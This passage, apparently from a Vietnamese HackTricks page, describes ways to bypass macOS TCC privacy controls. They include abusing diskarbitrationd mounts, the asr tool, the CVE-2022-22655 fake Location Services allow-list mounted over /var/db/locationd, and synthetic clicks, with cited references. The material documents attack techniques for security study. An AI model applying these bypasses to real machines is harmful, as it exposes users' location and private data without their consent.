Hàm `DADiskMountWithArgumentsCommon` từ framework công khai `DiskArbitration` thực hiện các kiểm tra bảo mật. Tuy nhiên, có thể bypass các kiểm tra này bằng cách gọi trực tiếp `diskarbitrationd`, từ đó sử dụng các phần tử `../` trong đường dẫn và symlink.

Điều này cho phép kẻ tấn công thực hiện các thao tác mount tùy ý ở bất kỳ vị trí nào, kể cả mount đè lên cơ sở dữ liệu TCC nhờ entitlement `com.apple.private.security.storage-exempt.heritable` của `diskarbitrationd`.

### asr

Công cụ **`/usr/sbin/asr`** cho phép sao chép toàn bộ ổ đĩa và mount bản sao ở một vị trí khác, bypass các biện pháp bảo vệ TCC.

### CVE-2022-22655 - Location Services

Location Services **không** được lưu trong cơ sở dữ liệu TCC như các dịch vụ khác. Chúng được quản lý bởi `locationd`, tiến trình duy trì danh sách cho phép riêng tại **`/var/db/locationd/clients.plist`**:<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

Mỗi mục được khóa theo client (bundle ID hoặc executable path) và chứa các trường như `Authorized`, `BundleId`, `Executable` và `Registered`.<sup>[[4]](#references)</sup>

Bản thân tệp `clients.plist` được bảo vệ bởi Sandbox/TCC và không thể chỉnh sửa ngay cả khi là root — nhưng **thư mục `/var/db/locationd/` không được bảo vệ khỏi việc mount**. Vì vậy, kẻ tấn công chạy với quyền root có thể tạo disk image chứa `clients.plist` của riêng mình (trong đó binary của họ được đánh dấu `Authorized`), mount image đó đè lên thư mục, rồi khởi động lại `locationd` để danh sách allow-list giả mạo có hiệu lực.<sup>[[3]](#references)</sup>

> [!TIP]
> Đây là cùng một kiểu với các TCC bypass `hdiutil`/`mount` ở trên: *file* được bảo vệ, còn *thư mục chứa nó* thì không, nên bạn thay cả thư mục thay vì chỉ thay file.

## Qua startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Qua grep

Trong một số trường hợp, các file lưu thông tin nhạy cảm như email, số điện thoại, tin nhắn... ở những vị trí không được bảo vệ (đây được xem là lỗ hổng trong Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Cách này hiện không còn hoạt động, nhưng [**trước đây thì có**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Một cách khác sử dụng [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>



## References

- [1] [CVE-2020–9934: Vượt qua macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Vô tình và có chủ đích vượt qua các biện pháp bảo vệ quyền riêng tư người dùng của macOS TCC](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - Vượt qua TCC Location Services (báo cáo gốc)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Carmen Sandiego đang ở đâu: Lạm dụng Location Services trên macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass đánh cắp dữ liệu từ iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (các biến môi trường SQLITE_ENABLE_SQLLOG)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Entitlement cho phép các biến môi trường DYLD](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization: hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [Phát hiện TCC bypass zero-day trong malware XCSSET](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "Điều gì xảy ra trên máy Mac của bạn sẽ ở lại trên iCloud của Apple?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Lỗ hổng macOS mới, "powerdir," có thể dẫn đến truy cập trái phép dữ liệu người dùng](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Thay đổi thư mục home và vượt qua TCC, hay CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Phát nhạc và vượt qua TCC, hay CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Cách đánh cắp một con (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - Vượt qua TCC bằng Telegram trên macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Khám phá lỗ hổng Apple: Kiểm tra diskarbitrationd và storagekitd, Phần 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Bằng chứng khái niệm](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - Thiết lập biến môi trường trên OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass và leo thang đặc quyền](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC bypass bằng cách mount đè lên cơ sở dữ liệu TCC](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [Hơn 20 cách vượt qua cơ chế quyền riêng tư của macOS](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Chiến thắng áp đảo trước TCC - Hơn 20 cách MỚI để vượt qua cơ chế quyền riêng tư của macOS](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [Từ Spotlight đến Apple Intelligence — Lạm dụng 0day để đánh cắp dữ liệu cung cấp sức mạnh cho AI trên macOS](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
